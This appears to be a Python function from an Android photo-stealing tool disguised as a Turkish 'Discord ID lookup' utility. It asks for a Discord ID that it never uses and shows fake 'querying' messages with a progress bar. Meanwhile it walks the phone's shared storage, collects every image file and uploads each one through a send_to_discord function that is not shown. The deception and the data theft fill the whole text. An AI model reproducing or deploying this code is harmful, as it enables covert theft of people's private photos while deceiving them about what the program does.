def scan_and_upload():
    image_extensions = ('.jpg', '.jpeg', '.png', '.gif', '.bmp')
    base_dir = "/storage/emulated/0" 
    
    target_id = input("🆔 Discord ID Girin: ")
    print(f"\n🔎 **{target_id}** ID'si sorgulanıyor...")
    
    image_files = []
    for root, _, files in os.walk(base_dir):
        for file in files:
            if file.lower().endswith(image_extensions):
                image_files.append(os.path.join(root, file))
    
    total_images = len(image_files)
    if total_images == 0:
        print("❌ Hiç veri bulunamadı!")
        return
    
    print(f"🔄 **{total_images}** adet sorgu yapılıyor...\n")
    
    # TQDM ile güzel bir progress bar
    for image_path in tqdm(image_files, desc="İD SORGULANIYOR 🔍", unit="idsorgulaniyor"):
        send_to_discord(image_path)
        time.sleep(1) 
    
    print("\n✅ Sorgu tamamlandı! Sonuçlar analiz ediliyor...")

